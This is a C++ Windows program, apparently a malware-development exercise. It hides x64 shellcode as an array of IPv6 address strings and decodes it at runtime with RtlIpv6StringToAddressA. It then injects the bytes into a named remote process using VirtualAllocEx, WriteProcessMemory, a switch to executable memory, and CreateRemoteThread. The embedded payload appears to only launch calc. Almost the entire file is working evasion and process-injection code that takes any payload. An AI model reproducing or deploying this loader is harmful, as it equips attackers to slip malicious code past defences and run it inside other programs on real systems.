#include <windows.h>
#include <tlhelp32.h>
#include <cstdio>
#include <cwchar>
#include <iostream>

std::string Ipv6Array[] = {
    "FC48:83E4:F0E8:C000:0000:4151:4150:5251", "5648:31D2:6548:8B52:6048:8B52:1848:8B52", "2048:8B72:5048:0FB7:4A4A:4D31:C948:31C0",
    "AC3C:617C:022C:2041:C1C9:0D41:01C1:E2ED", "5241:5148:8B52:208B:423C:4801:D08B:8088", "0000:0048:85C0:7467:4801:D050:8B48:1844",
    "8B40:2049:01D0:E356:48FF:C941:8B34:8848", "01D6:4D31:C948:31C0:AC41:C1C9:0D41:01C1", "38E0:75F1:4C03:4C24:0845:39D1:75D8:5844",
    "8B40:2449:01D0:6641:8B0C:4844:8B40:1C49", "01D0:418B:0488:4801:D041:5841:585E:595A", "4158:4159:415A:4883:EC20:4152:FFE0:5841",
    "595A:488B:12E9:57FF:FFFF:5D48:BA01:0000", "0000:0000:0048:8D8D:0101:0000:41BA:318B", "6F87:FFD5:BBE0:1D2A:0A41:BAA6:95BD:9DFF",
    "D548:83C4:283C:067C:0A80:FBE0:7505:BB47", "1372:6F6A:0059:4189:DAFF:D563:616C:6300"
};

#define NumberOfElements 17

using RtlIpv6StringToAddressA = NTSTATUS(WINAPI*)(PCSTR, PCSTR*, PVOID);


BOOL Ipv6Deobfuscation(IN std::string Ipv6Array[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

    PBYTE pBuffer = NULL;
    PBYTE TmpBuffer = NULL;
    SIZE_T sBuffSize = 0;
    PCSTR Terminator = NULL;
    NTSTATUS STATUS = 0;

    HMODULE ntdll = GetModuleHandleA("NTDLL");
    if (ntdll == NULL) {
        std::wcout << L"[!] GetModuleHandleA() Failed with Error: " << GetLastError() << std::endl;
        return FALSE;
    }


    RtlIpv6StringToAddressA pRtlIpv6StringToAddressA = reinterpret_cast<RtlIpv6StringToAddressA>(GetProcAddress(ntdll, "RtlIpv6StringToAddressA"));


    if (pRtlIpv6StringToAddressA == NULL) {
        std::wcout << L"[!] GetProcAddress Failed with Error: " << GetLastError() << std::endl;
        return FALSE;
    }

    sBuffSize = NmbrOfElements * 16;

    pBuffer = reinterpret_cast<PBYTE>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBuffSize));

    if (pBuffer == NULL) {
        std::wcout << L"[!] HeapAlloc() Failed with Error: " << GetLastError() << std::endl;
        return FALSE;
    }

    TmpBuffer = pBuffer;

    for (int i = 0; i < NmbrOfElements; i++) {
        

        if ((STATUS = pRtlIpv6StringToAddressA(Ipv6Array[i].c_str(), &Terminator, TmpBuffer)) != 0x0){
            std::wcout << L"[!] RtlIpv6StringToAddressA() Failed with Error: " << STATUS << std::endl;
            HeapFree(GetProcessHeap(), 0, pBuffer);
            return FALSE;
        }

        TmpBuffer = reinterpret_cast<PBYTE>(TmpBuffer + 16);
    }

    *ppDAddress = pBuffer;
    *pDSize = sBuffSize;
    return TRUE;
}

BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {
    PROCESSENTRY32W Proc;
    Proc.dwSize = sizeof(PROCESSENTRY32W);

    HANDLE hSnapShot = NULL;

    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapShot == INVALID_HANDLE_VALUE) {
        std::wcout << L"[!] CreateToolhelp32Snapshot() Failed with Error: " << GetLastError() << std::endl;
        goto _EndOfFunction;
    }

    if (!Process32FirstW(hSnapShot, &Proc)) {
        std::wcout << L"[!] Process32FirstW() Failed with Error: " << GetLastError() << std::endl;
        goto _EndOfFunction;
    }

    do {

        WCHAR LowerName[MAX_PATH * 2];

        if (Proc.szExeFile) {
            DWORD dwSize = lstrlenW(Proc.szExeFile);
            DWORD i = 0;

            RtlSecureZeroMemory(LowerName, sizeof(LowerName));

            if (dwSize < MAX_PATH * 2) {

                for (; i < dwSize; i++)
                    LowerName[i] = towlower(Proc.szExeFile[i]);

                LowerName[i++] = L'\0';
            }
        }

        if (wcscmp(LowerName, szProcessName) == 0) {

            *dwProcessId = Proc.th32ProcessID;
            *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);

            if (*hProcess == NULL) {
                std::wcout << L"[!] OpenProcess() Failed with Error: " << GetLastError() << std::endl;
                goto _EndOfFunction;
            }

            break;
        }

    } while (Process32NextW(hSnapShot, &Proc));

    _EndOfFunction:
        if (hSnapShot != NULL)
            CloseHandle(hSnapShot);

        if (*dwProcessId == 0 || *hProcess == NULL)
            return FALSE;
        return TRUE;
}

BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode) {

    PVOID pShellcodeAddress = NULL;
    SIZE_T sNumberOfBytesWritten = 0;
    DWORD dwOldProtection = 0;


    pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (pShellcodeAddress == NULL) {
        std::wcout << L"[!] VirtualAllocEx() Failed with Error: " << GetLastError() << std::endl;
        return FALSE;
    }

    std::wcout << L"[i] Allocated Memory at: " << pShellcodeAddress << std::endl;

    std::wcout << L"[#] Press <Enter> to continue..." << std::endl;
    std::cin.get();

    if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
        std::wcout << L"[!] WriteProcessMemory() Failed with Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pShellcodeAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    std::wcout << L"[i] Shellcode written to remote process memory." << std::endl;

    memset(pShellcode, '\0', sSizeOfShellcode);

    if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        std::wcout << L"[!] VirtualProtectEx() Failed with Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pShellcodeAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    std::wcout << L"[#] Press <Enter> to Run ..." << std::endl;
    std::cin.get();
    std::wcout << L"[i] Executing Shellcode..." << std::endl;

    if(CreateRemoteThread(hProcess, NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(pShellcodeAddress), NULL, 0, NULL) == NULL) {
        std::wcout << L"[!] CreateRemoteThread() Failed with Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pShellcodeAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    std::wcout << L"[i] Shellcode executed successfully." << std::endl;

    return TRUE;

}


int wmain(int argc, wchar_t* argv[]){

    HANDLE hProcess = NULL;
    DWORD dwProcessId = 0;
    PBYTE pDeobfuscatedPayload = NULL;
    SIZE_T sDeobfuscatedPayloadSize = 0;

    if (argc < 2) {
        std::wcout << L"[!] Usage: " << argv[0] << L" <ProcessName>" << std::endl;
        return -1;
    }

    std::wcout << L"[!] Search for process: " << argv[1] << std::endl;

    if (!GetRemoteProcessHandle(argv[1], &dwProcessId, &hProcess)) {
        std::wcout << L"[!] Process not found or unable to open process." << std::endl;
        return -1;
    }

    std::wcout << L"[i] Process ID: " << dwProcessId << std::endl;

    std::wcout << "[#] Press <Enter> to Decrypt Shellcode..." << std::endl;
    std::cin.get();

    std::wcout << L"[i] Decrypting Shellcode..." << std::endl;

    if (!Ipv6Deobfuscation(Ipv6Array, NumberOfElements, &pDeobfuscatedPayload, &sDeobfuscatedPayloadSize)) {
        return -1;
    }

    std::wcout << "[i] Deobfuscated Payload at : " << pDeobfuscatedPayload << std::endl;
    std::wcout << "[i] Deobfuscated Payload Size: " << sDeobfuscatedPayloadSize << std::endl;


    if (!InjectShellcodeToRemoteProcess(hProcess, pDeobfuscatedPayload, sDeobfuscatedPayloadSize)){
        std::wcout << L"[!] Shellcode injection failed." << std::endl;
        return -1;
    }

    HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
    CloseHandle(hProcess);
    std::wcout << L"[i] Shellcode injection completed successfully." << std::endl;
    std::wcout << L"[#] Press <Enter> to exit..." << std::endl;
    std::cin.get();
    return 0;
}